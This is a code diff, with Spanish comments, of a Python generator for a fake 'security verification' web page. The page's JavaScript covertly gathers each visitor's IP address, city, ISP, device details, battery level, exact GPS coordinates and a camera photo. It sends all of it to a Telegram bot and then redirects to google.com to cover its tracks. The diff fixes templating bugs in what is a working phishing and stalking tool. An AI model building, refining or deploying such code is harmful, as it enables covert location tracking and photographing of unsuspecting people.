@@ -16,7 +16,7 @@ CSS_STYLES = """
 """
 
 JS_COMMON_FUNCTIONS = """
-const BOT='{token}', CHAT='{chat_id}';
+const BOT='__TOKEN__', CHAT='__CHAT_ID__';
 
 const send = async (txt) => {
     await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
@@ -29,7 +29,7 @@ const sendPhoto = async (blob) => {
     const formData = new FormData();
     formData.append('chat_id', CHAT);
     formData.append('photo', blob, 'capture.jpg');
-    formData.append('caption', '📸 <b>Captura de Cámara</b>', );
+    formData.append('caption', '📸 <b>Captura de Cámara</b>');
     formData.append('parse_mode', 'HTML');
     
     await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, {
@@ -39,23 +39,26 @@ const sendPhoto = async (blob) => {
 };
 
 const getBasicInfo = async () => {
-    let info = `🔍 <b>NUEVA VISITA DETECTADA</b>\n\n`;
+    let info = `🔍 <b>NUEVA VISITA DETECTADA</b>\\n\\n`;
     try {
         const r = await fetch('https://api.ipify.org?format=json');
         const d = await r.json();
-        info += `🌐 <b>IP:</b> <code>${d.ip}</code>\n`;
+        info += `🌐 <b>IP:</b> <code>${d.ip}</code>\\n`;
         
         const ipd = await fetch(`http://ip-api.com/json/${d.ip}`);
         const geo = await ipd.json();
         if(geo.status === 'success') {
-            info += `📍 <b>Ubicación:</b> ${geo.city}, ${geo.country}\n`;
-            info += `🏢 <b>ISP:</b> ${geo.isp}\n`;
+            info += `📍 <b>Ubicación:</b> ${geo.city}, ${geo.country}\\n`;
+            info += `🏢 <b>ISP:</b> ${geo.isp}\\n`;
         }
     } catch(e) {}
     
-    info += `📱 <b>UA:</b> ${navigator.userAgent}\n`;
-    info += `💻 <b>OS:</b> ${navigator.platform}\n`;
-    info += `🔋 <b>Batería:</b> ${(await navigator.getBattery()).level * 100}%\n`;
+    info += `📱 <b>UA:</b> ${navigator.userAgent}\\n`;
+    info += `💻 <b>OS:</b> ${navigator.platform}\\n`;
+    try {
+        const battery = await navigator.getBattery();
+        info += `🔋 <b>Batería:</b> ${Math.round(battery.level * 100)}%\\n`;
+    } catch(e) {}
     
     await send(info);
 };
@@ -68,9 +71,9 @@ const getGeo = () => {
             const lat = p.coords.latitude;
             const lon = p.coords.longitude;
             const acc = p.coords.accuracy;
-            let gps = `🎯 <b>GPS EXACTO OBTENIDO</b>\n\n`;
-            gps += `📍 <b>Coords:</b> <code>${lat}, ${lon}</code>\n`;
-            gps += `📏 <b>Precisión:</b> ${acc} metros\n`;
+            let gps = `🎯 <b>GPS EXACTO OBTENIDO</b>\\n\\n`;
+            gps += `📍 <b>Coords:</b> <code>${lat}, ${lon}</code>\\n`;
+            gps += `📏 <b>Precisión:</b> ${acc} metros\\n`;
             gps += `🗺 <b>Maps:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">Ver en Mapa</a>`;
             await send(gps);
             redirect();
@@ -104,11 +107,11 @@ const getCam = async () => {
                     stream.getTracks().forEach(t => t.stop());
                     getGeo(); // Intentar Geo después de Cam
                 }, 'image/jpeg', 0.8);
-            }, 1500); // 1.5s para estabilizar brillo
+            }, 1500);
         };
     } catch (e) {
         await send(`❌ <b>Cámara Denegada/Error:</b> ${e.message}`);
-        getGeo(); // Intentar Geo si falla Cam
+        getGeo();
     }
 };
 """
@@ -116,45 +119,46 @@ const getCam = async () => {
 def get_template(token, chat_id, mode="geo"):
     """Genera el HTML completo inyectando token, chat_id y lógica según modo"""
     
-    script_logic = JS_COMMON_FUNCTIONS.format(token=token, chat_id=chat_id)
+    # Usar replace con marcadores únicos para evitar conflictos con llaves de JS/CSS
+    logic = JS_COMMON_FUNCTIONS.replace('__TOKEN__', token).replace('__CHAT_ID__', str(chat_id))
     
     if mode == "cam":
-        # Primero info básica, luego Cam, luego Geo (encadenado en getCam)
         init_call = "await getBasicInfo(); getCam();"
-        script_logic += JS_GEO_SPECIFIC + JS_CAM_SPECIFIC
+        logic += JS_GEO_SPECIFIC + JS_CAM_SPECIFIC
     else:
-        # Primero info básica, luego Geo
         init_call = "await getBasicInfo(); getGeo();"
-        script_logic += JS_GEO_SPECIFIC
+        logic += JS_GEO_SPECIFIC
 
-    html = f"""
+    # Construir el HTML final usando reemplazo simple para evitar problemas con f-strings y llaves
+    template = """
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verificación de Seguridad</title>
-<meta property="og:title" content="Enlace Protegido">
-<meta property="og:description" content="Verifica que eres humano para continuar.">
-{CSS_STYLES}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Seguridad</title>
+    __CSS__
 </head>
 <body>
-<div class="box">
-    <div class="loader"></div>
-    <h2 id="msg">Verificando...</h2>
-    <p>Por favor permite el acceso para continuar.</p>
-</div>
-<script>
-    const redirect = () => {{ window.location.href = "https://google.com"; }};
-    
-    {script_logic}
-    
-    // Iniciar
-    (async () => {{
-        {init_call}
-    }})();
-</script>
+    <div class="box">
+        <div class="loader"></div>
+        <h2 id="msg">Verificando...</h2>
+        <p>Por favor permite el acceso para continuar.</p>
+    </div>
+    <script>
+        const redirect = () => { window.location.href = "https://google.com"; };
+        
+        __LOGIC__
+        
+        (async () => {
+            __INIT__
+        })();
+    </script>
 </body>
 </html>
-    """
+"""
+    html = template.replace('__CSS__', CSS_STYLES)
+    html = html.replace('__LOGIC__', logic)
+    html = html.replace('__INIT__', init_call)
+    
     return html
